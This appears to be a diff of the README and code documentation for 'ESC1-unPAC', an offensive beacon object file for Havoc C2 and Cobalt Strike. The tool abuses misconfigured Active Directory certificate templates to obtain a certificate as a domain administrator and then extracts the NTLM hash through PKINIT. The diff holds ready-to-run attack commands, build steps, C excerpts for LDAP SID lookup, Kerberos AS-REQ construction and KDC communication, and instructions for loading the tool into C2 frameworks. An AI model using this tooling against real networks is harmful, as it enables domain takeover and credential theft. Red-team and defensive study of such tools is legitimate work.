@@ -1,7 +1,6 @@
-
 # ESC1-unPAC
 
-Active Directory Certificate Services (ADCS) exploitation BOF for Havoc C2.
+Active Directory Certificate Services (ADCS) exploitation BOF for Havoc C2 and Cobalt Strike.
 
 **Complete attack chain:**
 1. **ESC1** - Request certificate with arbitrary SAN (Subject Alternative Name), and SID to bypass strong mapping.
@@ -12,10 +11,12 @@ Active Directory Certificate Services (ADCS) exploitation BOF for Havoc C2.
 
 ```bash
 # On Kali
-cd /home/kali/ESC1-unPAC
-make
+git clone https://github.com/RayRRT/ESC1-unPAC.git && cd ESC1-unPAC && chmod +x build.sh && ./build.sh
 
 # In Havoc
+esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template administrator@evilcorp.net
+
+# In Cobalt Strike (same command)
 esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template administrator@evilcorp.net
 ```
 
@@ -38,8 +39,13 @@ doIFqjCCBaagAwIBBaEDAgEWooIEtjCCBLJhggSuMIIEqqAD...
 ESC1-unPAC/
 ├── README.md
 ├── Makefile
+├── build.sh
 ├── havoc/
 │   ├── esc1-unpac.py           # Havoc extension
+│   └── bofs/
+│       └── ESC1-unPAC.x64.o    # Compiled BOF
+├── cobaltstrike/
+│   ├── esc1-unpac.cna          # Cobalt Strike aggressor script
 │   └── bofs/
 │       └── ESC1-unPAC.x64.o    # Compiled BOF
 ├── src/adcs/
@@ -53,7 +59,7 @@ ESC1-unPAC/
 
 # Code Documentation
 
-## spicyad.c - Complete Implementation (Single File)
+## esc1-unpac.c - Complete Implementation (Single File)
 
 ### Entry Point
 
@@ -61,7 +67,7 @@ ESC1-unPAC/
 void go(char* args, int alen)
 ```
 
-BOF entry. Parses arguments and calls `DoESC1UnPAC()`.
+BOF entry. Parses arguments using custom ArgParser and calls `DoESC1UnPAC()`.
 
 **Arguments:**
 | # | Name | Description | Example |
@@ -71,6 +77,27 @@ BOF entry. Parses arguments and calls `DoESC1UnPAC()`.
 | 3 | UPN | Target user | `administrator@evilcorp.net` |
 | 4 | KDC | KDC hostname (optional) | `dc01.evilcorp.net` |
 | 5 | nosid | Disable SID (optional) | `nosid` |
+
+### ArgParser (Custom)
+
+```c
+typedef struct {
+    char* buffer;
+    int length;
+    int position;
+} ArgParser;
+
+static char* ArgParserGetString(ArgParser* p) {
+    // Reads: [4-byte length][string data]
+    unsigned int strLen = *(unsigned int*)(p->buffer + p->position);
+    p->position += 4;
+    char* str = p->buffer + p->position;
+    p->position += strLen;
+    return str;
+}
+```
+
+**Note:** Both Havoc (.py) and Cobalt Strike (.cna) pack arguments in this format.
 
 ### DoESC1UnPAC
 
@@ -139,14 +166,24 @@ CryptBinaryToStringA(pfxBlob.pbData, pfxBlob.cbData,
 static BOOL LookupUserSID_Unpac(const char* szUPN, BYTE** ppSid, DWORD* pdwSidLen)
 ```
 
-LDAP query for user's SID:
+LDAP query for user's SID with **sAMAccountName fallback** for users without UPN:
 
 ```c
 pLdap = ldap_initW(wszDomain, LDAP_PORT);
 ldap_bind_sW(pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
 
+// First try: userPrincipalName
 swprintf(wszFilter, L"(userPrincipalName=%s)", wszUPN);
 ldap_search_sW(pLdap, wszBaseDN, LDAP_SCOPE_SUBTREE, wszFilter, attrs, 0, &pResults);
+
+pEntry = ldap_first_entry(pLdap, pResults);
+
+// Fallback: sAMAccountName (for users without UPN)
+if (!pEntry && usernameLen > 0) {
+    swprintf(wszFilter, L"(sAMAccountName=%s)", wszSamAccount);
+    ldap_search_sW(pLdap, wszBaseDN, LDAP_SCOPE_SUBTREE, wszFilter, attrs, 0, &pResults);
+    pEntry = ldap_first_entry(pLdap, pResults);
+}
 
 ppValues = ldap_get_values_lenW(pLdap, pEntry, L"objectSid");
 ```
@@ -189,11 +226,14 @@ Minimal big integer for DH calculations:
 
 ```c
 typedef struct {
-    BYTE data[512];
+    DWORD words[64];
     int len;
 } BigInt;
 
 static void bigint_modpow(BigInt* result, BigInt* base, BigInt* exp, BigInt* mod);
+static void bigint_mul(BigInt* result, BigInt* a, BigInt* b);
+static void bigint_sub(BigInt* result, BigInt* a, BigInt* b);
+static void bigint_mod(BigInt* result, BigInt* a, BigInt* p);
 ```
 
 ### GenerateDHKeys
@@ -236,7 +276,8 @@ hMsg = CryptMsgOpenToEncode(
 ### BuildAuthPack
 
 ```c
-static BYTE* BuildAuthPack(PCCERT_CONTEXT pCert, BYTE* reqBodyHash, int* outLen)
+static BYTE* BuildAuthPack(const char* user, const char* realm,
+                           BYTE* reqBodyHash, int* outLen)
 ```
 
 Builds RFC 4556 AuthPack:
@@ -283,7 +324,7 @@ AS-REQ ::= [APPLICATION 10] SEQUENCE {
 ### SendToKdc
 
 ```c
-static BYTE* SendToKdc(const char* kdcHost, BYTE* request, int requestLen, int* respLen)
+static BYTE* SendToKdc(const char* kdcHost, int port, BYTE* data, int dataLen, int* respLen)
 ```
 
 TCP port 88 with length prefix:
@@ -303,8 +344,8 @@ send(sock, request, requestLen, 0);
 ### ProcessAsRep
 
 ```c
-static void ProcessAsRep(BYTE* asRep, int asRepLen, const char* user,
-                          const char* realm, const char* kdcHost)
+static void ProcessAsRep(BYTE* asRep, int asRepLen, PCCERT_CONTEXT pCert,
+                          const char* user, const char* realm, const char* kdcHost)
 ```
 
 #### Step 1: Check for KRB-ERROR
@@ -446,17 +487,18 @@ NTLM_SUPPLEMENTAL_CREDENTIAL {
 # Install mingw on Kali
 sudo apt install mingw-w64
 
-# Build
-make
+# Build (compiles to both havoc/bofs and cobaltstrike/bofs)
+./build.sh
 
-# Output: havoc/bofs/ESC1-unPAC.x64.o
+# Or manually
+make
 ```
 
 ### Compiler Flags
 
 ```makefile
-CFLAGS = -c -Os -fno-stack-protector -ffunction-sections
-CFLAGS += -fno-asynchronous-unwind-tables -masm=intel -fno-ident
+CFLAGS = -c -Os -fno-stack-protector -fno-asynchronous-unwind-tables
+CFLAGS += -masm=intel -fno-ident -Wno-pointer-arith
 ```
 
 | Flag | Purpose |
@@ -464,12 +506,20 @@ CFLAGS += -fno-asynchronous-unwind-tables -masm=intel -fno-ident
 | `-c` | Compile only, no link |
 | `-Os` | Optimize for size |
 | `-fno-stack-protector` | No stack canaries (BOF requirement) |
-| `-ffunction-sections` | Separate sections per function |
 | `-fno-asynchronous-unwind-tables` | No .eh_frame |
+| `-masm=intel` | Intel assembly syntax |
+
+**Note:** `-ffunction-sections` removed for Cobalt Strike compatibility (CS requires single `.text` section).
 
 ---
 
 ## Usage
+
+### Havoc
+1. Scripts → Load Script → `havoc/esc1-unpac.py`
+
+### Cobalt Strike
+1. Script Manager → Load → `cobaltstrike/esc1-unpac.cna`
 
 ### Basic
 ```
